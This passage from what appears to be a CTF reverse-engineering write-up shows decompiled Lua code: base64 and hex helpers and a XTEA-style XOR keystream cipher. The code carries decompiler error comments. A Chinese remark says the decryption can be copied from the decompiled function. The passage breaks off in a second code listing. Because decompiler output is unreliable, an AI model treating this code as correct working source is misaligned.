class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- params : ...</span></span><br><span class="line"><span class="comment">-- function num : 0 , upvalues : _ENV</span></span><br><span class="line"><span class="keyword">local</span> base64 = &#123;&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">_G</span>.bit32 <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">local</span> extract = (<span class="built_in">_G</span>.bit32).extract</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> extract <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">_G</span>.bit <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">local</span> shl, shr, band = (<span class="built_in">_G</span>.bit).lshift, (<span class="built_in">_G</span>.bit).rshift, (<span class="built_in">_G</span>.bit).band</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      extract = <span class="function"><span class="keyword">function</span><span class="params">(v, from, width)</span></span></span><br><span class="line">  <span class="comment">-- function num : 0_0 , upvalues : band, shr, shl</span></span><br><span class="line">  <span class="keyword">return</span> band(shr(v, from), shl(<span class="number">1</span>, width) - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">if</span> <span class="built_in">_G</span>.<span class="built_in">_VERSION</span> == <span class="string">&quot;Lua 5.1&quot;</span> <span class="keyword">then</span></span><br><span class="line">        extract = <span class="function"><span class="keyword">function</span><span class="params">(v, from, width)</span></span></span><br><span class="line">  <span class="comment">-- function num : 0_1</span></span><br><span class="line">  <span class="keyword">local</span> w = <span class="number">0</span></span><br><span class="line">  <span class="keyword">local</span> flag = <span class="number">2</span> ^ from</span><br><span class="line">  <span class="keyword">for</span> i = <span class="number">0</span>, width - <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">local</span> flag2 = flag + flag</span><br><span class="line">    <span class="keyword">if</span> flag &lt;= v % flag2 <span class="keyword">then</span></span><br><span class="line">      w = w + <span class="number">2</span> ^ i</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    flag = flag2</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> w</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        extract = (<span class="built_in">load</span>(<span class="string">&quot;return function( v, from, width )\n\t\t\treturn ( v &gt;&gt; from ) &amp; ((1 &lt;&lt; width) - 1)\n\t\tend&quot;</span>))()</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      base64.makeencoder = <span class="function"><span class="keyword">function</span><span class="params">(s62, s63, spad)</span></span></span><br><span class="line">  <span class="comment">-- function num : 0_2 , upvalues : _ENV</span></span><br><span class="line">  <span class="keyword">local</span> encoder = &#123;&#125;</span><br><span class="line">  <span class="keyword">for</span> b64code,<span class="built_in">char</span> <span class="keyword">in</span> <span class="built_in">pairs</span>(&#123;<span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;F&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;I&quot;</span>, <span class="string">&quot;J&quot;</span>, <span class="string">&quot;K&quot;</span>, <span class="string">&quot;L&quot;</span>, <span class="string">&quot;M&quot;</span>, <span class="string">&quot;N&quot;</span>, <span class="string">&quot;O&quot;</span>, <span class="string">&quot;P&quot;</span>, <span class="string">&quot;Q&quot;</span>, <span class="string">&quot;R&quot;</span>, <span class="string">&quot;S&quot;</span>, <span class="string">&quot;T&quot;</span>, <span class="string">&quot;U&quot;</span>, <span class="string">&quot;V&quot;</span>, <span class="string">&quot;W&quot;</span>, <span class="string">&quot;X&quot;</span>, <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;Z&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;f&quot;</span>, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;h&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;j&quot;</span>, <span class="string">&quot;k&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;m&quot;</span>, <span class="string">&quot;n&quot;</span>, <span class="string">&quot;o&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;q&quot;</span>, <span class="string">&quot;r&quot;</span>, <span class="string">&quot;s&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="string">&quot;u&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="string">&quot;z&quot;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>, s62 <span class="keyword">or</span> <span class="string">&quot;+&quot;</span>, s63 <span class="keyword">or</span> <span class="string">&quot;/&quot;</span>, spad <span class="keyword">or</span> <span class="string">&quot;=&quot;</span>; [<span class="number">0</span>] = <span class="string">&quot;A&quot;</span>&#125;) <span class="keyword">do</span></span><br><span class="line">    encoder[b64code] = <span class="built_in">char</span>:<span class="built_in">byte</span>()</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> encoder</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      base64.makedecoder = <span class="function"><span class="keyword">function</span><span class="params">(s62, s63, spad)</span></span></span><br><span class="line">  <span class="comment">-- function num : 0_3 , upvalues : _ENV, base64</span></span><br><span class="line">  <span class="keyword">local</span> decoder = &#123;&#125;</span><br><span class="line">  <span class="keyword">for</span> b64code,charcode <span class="keyword">in</span> <span class="built_in">pairs</span>((base64.makeencoder)(s62, s63, spad)) <span class="keyword">do</span></span><br><span class="line">    decoder[charcode] = b64code</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> decoder</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">local</span> DEFAULT_ENCODER = (base64.makeencoder)()</span><br><span class="line">      <span class="keyword">local</span> DEFAULT_DECODER = (base64.makedecoder)()</span><br><span class="line">      <span class="keyword">local</span> <span class="built_in">char</span>, <span class="built_in">concat</span> = <span class="built_in">string</span>.<span class="built_in">char</span>, <span class="built_in">table</span>.<span class="built_in">concat</span></span><br><span class="line">      base64.encode = <span class="function"><span class="keyword">function</span><span class="params">(str, encoder, usecaching)</span></span></span><br><span class="line">  <span class="comment">-- function num : 0_4 , upvalues : DEFAULT_ENCODER, char, extract, concat</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> encoder <span class="keyword">then</span></span><br><span class="line">    encoder = DEFAULT_ENCODER</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">local</span> t, k, n = &#123;&#125;, <span class="number">1</span>, #str</span><br><span class="line">  <span class="keyword">local</span> lastn = n % <span class="number">3</span></span><br><span class="line">  <span class="keyword">local</span> cache = &#123;&#125;</span><br><span class="line">  <span class="keyword">for</span> i = <span class="number">1</span>, n - lastn, <span class="number">3</span> <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">local</span> a, b, c = str:<span class="built_in">byte</span>(i, i + <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">local</span> v = a * <span class="number">65536</span> + b * <span class="number">256</span> + c</span><br><span class="line">    <span class="keyword">local</span> s = <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">if</span> usecaching <span class="keyword">then</span></span><br><span class="line">      s = cache[v]</span><br><span class="line">      <span class="keyword">if</span> <span class="keyword">not</span> s <span class="keyword">then</span></span><br><span class="line">        s = <span class="built_in">char</span>(encoder[extract(v, <span class="number">18</span>, <span class="number">6</span>)], encoder[extract(v, <span class="number">12</span>, <span class="number">6</span>)], encoder[extract(v, <span class="number">6</span>, <span class="number">6</span>)], encoder[extract(v, <span class="number">0</span>, <span class="number">6</span>)])</span><br><span class="line">        cache[v] = s</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      s = <span class="built_in">char</span>(encoder[extract(v, <span class="number">18</span>, <span class="number">6</span>)], encoder[extract(v, <span class="number">12</span>, <span class="number">6</span>)], encoder[extract(v, <span class="number">6</span>, <span class="number">6</span>)], encoder[extract(v, <span class="number">0</span>, <span class="number">6</span>)])</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    t[k] = s</span><br><span class="line">    k = k + <span class="number">1</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">if</span> lastn == <span class="number">2</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">local</span> a, b = str:<span class="built_in">byte</span>(n - <span class="number">1</span>, n)</span><br><span class="line">    <span class="keyword">local</span> v = a * <span class="number">65536</span> + b * <span class="number">256</span></span><br><span class="line">    t[k] = <span class="built_in">char</span>(encoder[extract(v, <span class="number">18</span>, <span class="number">6</span>)], encoder[extract(v, <span class="number">12</span>, <span class="number">6</span>)], encoder[extract(v, <span class="number">6</span>, <span class="number">6</span>)], encoder[<span class="number">64</span>])</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> lastn == <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">          <span class="keyword">local</span> v = str:<span class="built_in">byte</span>(n) * <span class="number">65536</span></span><br><span class="line">          t[k] = <span class="built_in">char</span>(encoder[extract(v, <span class="number">18</span>, <span class="number">6</span>)], encoder[extract(v, <span class="number">12</span>, <span class="number">6</span>)], encoder[<span class="number">64</span>], encoder[<span class="number">64</span>])</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">concat</span>(t)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      base64.decode = <span class="function"><span class="keyword">function</span><span class="params">(b64, decoder, usecaching)</span></span></span><br><span class="line">  <span class="comment">-- function num : 0_5 , upvalues : DEFAULT_DECODER, _ENV, char, extract, concat</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> decoder <span class="keyword">then</span></span><br><span class="line">    decoder = DEFAULT_DECODER</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">local</span> pattern = <span class="string">&quot;[^%w%+%/%=]&quot;</span></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> decoder <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">local</span> s62, s63 = <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line">      <span class="keyword">for</span> charcode,b64code <span class="keyword">in</span> <span class="built_in">pairs</span>(decoder) <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> b64code == <span class="number">62</span> <span class="keyword">then</span></span><br><span class="line">          s62 = charcode</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          <span class="keyword">if</span> b64code == <span class="number">63</span> <span class="keyword">then</span></span><br><span class="line">            s63 = charcode</span><br><span class="line">          <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      pattern = (<span class="string">&quot;[^%%w%%%s%%%s%%=]&quot;</span>):<span class="built_in">format</span>(<span class="built_in">char</span>(s62), <span class="built_in">char</span>(s63))</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    b64 = b64:<span class="built_in">gsub</span>(pattern, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> usecaching <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">local</span> cache = &#123;&#125;</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">local</span> t, k = &#123;&#125;, <span class="number">1</span></span><br><span class="line">    <span class="keyword">local</span> n = #b64</span><br><span class="line">    <span class="keyword">local</span> padding = (b64:<span class="built_in">sub</span>(<span class="number">-2</span>) == <span class="string">&quot;==&quot;</span> <span class="keyword">and</span> <span class="number">2</span>) <span class="keyword">or</span> (b64:<span class="built_in">sub</span>(<span class="number">-1</span>) == <span class="string">&quot;=&quot;</span> <span class="keyword">and</span> <span class="number">1</span>) <span class="keyword">or</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i = <span class="number">1</span>, padding &gt; <span class="number">0</span> <span class="keyword">and</span> n - <span class="number">4</span> <span class="keyword">or</span> n, <span class="number">4</span> <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">local</span> a, b, c, d = b64:<span class="built_in">byte</span>(i, i + <span class="number">3</span>)</span><br><span class="line">      <span class="keyword">local</span> s = <span class="literal">nil</span></span><br><span class="line">      <span class="keyword">if</span> usecaching <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">local</span> v0 = a * <span class="number">16777216</span> + b * <span class="number">65536</span> + c * <span class="number">256</span> + d</span><br><span class="line">        s = cache[v0]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> s <span class="keyword">then</span></span><br><span class="line">          <span class="keyword">local</span> v = decoder[a] * <span class="number">262144</span> + decoder[b] * <span class="number">4096</span> + decoder[c] * <span class="number">64</span> + decoder[d]</span><br><span class="line">          s = <span class="built_in">char</span>(extract(v, <span class="number">16</span>, <span class="number">8</span>), extract(v, <span class="number">8</span>, <span class="number">8</span>), extract(v, <span class="number">0</span>, <span class="number">8</span>))</span><br><span class="line">          cache[v0] = s</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">              <span class="keyword">local</span> v = decoder[a] * <span class="number">262144</span> + decoder[b] * <span class="number">4096</span> + decoder[c] * <span class="number">64</span> + decoder[d]</span><br><span class="line">              s = <span class="built_in">char</span>(extract(v, <span class="number">16</span>, <span class="number">8</span>), extract(v, <span class="number">8</span>, <span class="number">8</span>), extract(v, <span class="number">0</span>, <span class="number">8</span>))</span><br><span class="line">              t[k] = s</span><br><span class="line">              k = k + <span class="number">1</span></span><br><span class="line">              <span class="comment">-- DECOMPILER ERROR at PC143: LeaveBlock: unexpected jumping out DO_STMT</span></span><br><span class="line"></span><br><span class="line">              <span class="comment">-- DECOMPILER ERROR at PC143: LeaveBlock: unexpected jumping out DO_STMT</span></span><br><span class="line"></span><br><span class="line">              <span class="comment">-- DECOMPILER ERROR at PC143: LeaveBlock: unexpected jumping out IF_ELSE_STMT</span></span><br><span class="line"></span><br><span class="line">              <span class="comment">-- DECOMPILER ERROR at PC143: LeaveBlock: unexpected jumping out IF_STMT</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">          <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> padding == <span class="number">1</span> <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">local</span> a, b, c = b64:<span class="built_in">byte</span>(n - <span class="number">3</span>, n - <span class="number">1</span>)</span><br><span class="line">      <span class="keyword">local</span> v = decoder[a] * <span class="number">262144</span> + decoder[b] * <span class="number">4096</span> + decoder[c] * <span class="number">64</span></span><br><span class="line">      t[k] = <span class="built_in">char</span>(extract(v, <span class="number">16</span>, <span class="number">8</span>), extract(v, <span class="number">8</span>, <span class="number">8</span>))</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> padding == <span class="number">2</span> <span class="keyword">then</span></span><br><span class="line">          <span class="keyword">local</span> a, b = b64:<span class="built_in">byte</span>(n - <span class="number">3</span>, n - <span class="number">2</span>)</span><br><span class="line">          <span class="keyword">local</span> v = decoder[a] * <span class="number">262144</span> + decoder[b] * <span class="number">4096</span></span><br><span class="line">          t[k] = <span class="built_in">char</span>(extract(v, <span class="number">16</span>, <span class="number">8</span>))</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">          <span class="keyword">return</span> <span class="built_in">concat</span>(t)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">local</span> strf = <span class="built_in">string</span>.<span class="built_in">format</span></span><br><span class="line">      <span class="keyword">local</span> <span class="built_in">byte</span>, <span class="built_in">char</span> = <span class="built_in">string</span>.<span class="built_in">byte</span>, <span class="built_in">string</span>.<span class="built_in">char</span></span><br><span class="line">      <span class="keyword">local</span> spack, sunpack = <span class="built_in">string</span>.pack, <span class="built_in">string</span>.<span class="built_in">unpack</span></span><br><span class="line">      <span class="keyword">local</span> app, <span class="built_in">concat</span> = <span class="built_in">table</span>.<span class="built_in">insert</span>, <span class="built_in">table</span>.<span class="built_in">concat</span></span><br><span class="line">      <span class="keyword">local</span> stohex = <span class="function"><span class="keyword">function</span><span class="params">(s, ln, sep)</span></span></span><br><span class="line">  <span class="comment">-- function num : 0_6 , upvalues : strf, byte, concat</span></span><br><span class="line">  <span class="keyword">if</span> #s == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> ln <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span> s:<span class="built_in">gsub</span>(<span class="string">&quot;.&quot;</span>, <span class="function"><span class="keyword">function</span><span class="params">(c)</span></span></span><br><span class="line">    <span class="comment">-- function num : 0_6_0 , upvalues : strf, byte</span></span><br><span class="line">    <span class="keyword">return</span> strf(<span class="string">&quot;%02x&quot;</span>, <span class="built_in">byte</span>(c))</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> sep <span class="keyword">then</span></span><br><span class="line">    sep = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">local</span> t = &#123;&#125;</span><br><span class="line">  <span class="keyword">for</span> i = <span class="number">1</span>, #s - <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">    t[#t + <span class="number">1</span>] = strf(<span class="string">&quot;%02x%s&quot;</span>, s:<span class="built_in">byte</span>(i), i % ln == <span class="number">0</span> <span class="keyword">and</span> <span class="string">&quot;\n&quot;</span> <span class="keyword">or</span> sep)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  t[#t + <span class="number">1</span>] = strf(<span class="string">&quot;%02x&quot;</span>, s:<span class="built_in">byte</span>(#s))</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">concat</span>(t)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">local</span> hextos = <span class="function"><span class="keyword">function</span><span class="params">(hs, unsafe)</span></span></span><br><span class="line">  <span class="comment">-- function num : 0_7 , upvalues : _ENV, char</span></span><br><span class="line">  <span class="keyword">local</span> <span class="built_in">tonumber</span> = <span class="built_in">tonumber</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> unsafe <span class="keyword">then</span></span><br><span class="line">    hs = (<span class="built_in">string</span>.<span class="built_in">gsub</span>)(hs, <span class="string">&quot;%s+&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">string</span>.<span class="built_in">find</span>)(hs, <span class="string">&quot;[^0-9A-Za-z]&quot;</span>) <span class="keyword">or</span> #hs % <span class="number">2</span> ~= <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">error</span>(<span class="string">&quot;invalid hex string&quot;</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">return</span> hs:<span class="built_in">gsub</span>(<span class="string">&quot;(%x%x)&quot;</span>, <span class="function"><span class="keyword">function</span><span class="params">(c)</span></span></span><br><span class="line">    <span class="comment">-- function num : 0_7_0 , upvalues : char, tonumber</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">char</span>(<span class="built_in">tonumber</span>(c, <span class="number">16</span>))</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">local</span> stx = stohex</span><br><span class="line">      <span class="keyword">local</span> xts = hextos</span><br><span class="line">      <span class="keyword">local</span> ROUNDS = <span class="number">64</span></span><br><span class="line">      <span class="keyword">local</span> keysetup = <span class="function"><span class="keyword">function</span><span class="params">(key)</span></span></span><br><span class="line">  <span class="comment">-- function num : 0_8 , upvalues : _ENV, sunpack, ROUNDS</span></span><br><span class="line">  <span class="built_in">assert</span>(#key == <span class="number">16</span>)</span><br><span class="line">  <span class="keyword">local</span> kt = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;</span><br><span class="line">  kt[<span class="number">1</span>] = sunpack(<span class="string">&quot;&gt;I4I4I4I4&quot;</span>, key)</span><br><span class="line">  <span class="keyword">local</span> skt0 = &#123;&#125;</span><br><span class="line">  <span class="keyword">local</span> skt1 = &#123;&#125;</span><br><span class="line">  <span class="keyword">local</span> sum, delta = <span class="number">0</span>, <span class="number">2654435769</span></span><br><span class="line">  <span class="keyword">for</span> i = <span class="number">1</span>, ROUNDS <span class="keyword">do</span></span><br><span class="line">    skt0[i] = sum + kt[(sum &amp; <span class="number">3</span>) + <span class="number">1</span>]</span><br><span class="line">    sum = sum + delta &amp; <span class="number">4294967295</span></span><br><span class="line">    skt1[i] = (sum) + kt[((sum) &gt;&gt; <span class="number">11</span> &amp; <span class="number">3</span>) + <span class="number">1</span>]</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">do</span> <span class="keyword">return</span> &#123;skt0 = skt0, skt1 = skt1&#125; <span class="keyword">end</span></span><br><span class="line">  <span class="comment">-- DECOMPILER ERROR: 1 unprocessed JMP targets</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">local</span> encrypt_u64 = <span class="function"><span class="keyword">function</span><span class="params">(st, bu)</span></span></span><br><span class="line">  <span class="comment">-- function num : 0_9 , upvalues : ROUNDS</span></span><br><span class="line">  <span class="keyword">local</span> skt0, skt1 = st.skt0, st.skt1</span><br><span class="line">  <span class="keyword">local</span> v0, v1 = bu &gt;&gt; <span class="number">32</span>, bu &amp; <span class="number">4294967295</span></span><br><span class="line">  <span class="keyword">local</span> sum, delta = <span class="number">0</span>, <span class="number">2654435769</span></span><br><span class="line">  <span class="keyword">for</span> i = <span class="number">1</span>, ROUNDS <span class="keyword">do</span></span><br><span class="line">    v0 = v0 + ((v1 &lt;&lt; <span class="number">4</span> ~ v1 &gt;&gt; <span class="number">5</span>) + v1 ~ skt0[i]) &amp; <span class="number">4294967295</span></span><br><span class="line">    v1 = v1 + (((v0) &lt;&lt; <span class="number">4</span> ~ (v0) &gt;&gt; <span class="number">5</span>) + (v0) ~ skt1[i]) &amp; <span class="number">4294967295</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  bu = (v0) &lt;&lt; <span class="number">32</span> | v1</span><br><span class="line">  <span class="keyword">return</span> bu</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">local</span> enc = <span class="function"><span class="keyword">function</span><span class="params">(key, iv, itxt)</span></span></span><br><span class="line">  <span class="comment">-- function num : 0_10 , upvalues : _ENV, sunpack, keysetup, encrypt_u64, spack, app, concat</span></span><br><span class="line">  <span class="built_in">assert</span>(#key == <span class="number">16</span>, <span class="string">&quot;bad key length&quot;</span>)</span><br><span class="line">  <span class="built_in">assert</span>(#iv == <span class="number">8</span>, <span class="string">&quot;bad IV length&quot;</span>)</span><br><span class="line">  <span class="keyword">if</span> #itxt == <span class="number">0</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">local</span> ivu = sunpack(<span class="string">&quot;&lt;I8&quot;</span>, iv)</span><br><span class="line">  <span class="keyword">local</span> ot = &#123;&#125;</span><br><span class="line">  <span class="keyword">local</span> rbn = #itxt</span><br><span class="line">  <span class="keyword">local</span> ksu, ibu, ob = <span class="literal">nil</span>, <span class="literal">nil</span>, <span class="literal">nil</span></span><br><span class="line">  <span class="keyword">local</span> st = keysetup(key)</span><br><span class="line">  <span class="keyword">for</span> i = <span class="number">1</span>, #itxt, <span class="number">8</span> <span class="keyword">do</span></span><br><span class="line">    ksu = encrypt_u64(st, ivu ~ i)</span><br><span class="line">    <span class="keyword">if</span> rbn &lt; <span class="number">8</span> <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">local</span> buffer = (<span class="built_in">string</span>.<span class="built_in">sub</span>)(itxt, i) .. (<span class="built_in">string</span>.<span class="built_in">rep</span>)(<span class="string">&quot;\000&quot;</span>, <span class="number">8</span> - rbn)</span><br><span class="line">      ibu = sunpack(<span class="string">&quot;&lt;I8&quot;</span>, buffer)</span><br><span class="line">      ob = (<span class="built_in">string</span>.<span class="built_in">sub</span>)(spack(<span class="string">&quot;&lt;I8&quot;</span>, ibu ~ ksu), <span class="number">1</span>, rbn)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      ibu = sunpack(<span class="string">&quot;&lt;I8&quot;</span>, itxt, i)</span><br><span class="line">      ob = spack(<span class="string">&quot;&lt;I8&quot;</span>, ibu ~ ksu)</span><br><span class="line">      rbn = rbn - <span class="number">8</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    app(ot, ob)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">do</span> <span class="keyword">return</span> <span class="built_in">concat</span>(ot) <span class="keyword">end</span></span><br><span class="line">  <span class="comment">-- DECOMPILER ERROR: 5 unprocessed JMP targets</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">-- WARNING: undefined locals caused missing assignments!</span></span><br><span class="line">      <span class="comment">-- DECOMPILER ERROR: 1 unprocessed JMP targets</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​        可以看出实际上是对输入进行一个异或，抄一下反编译出的函数解密就行</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 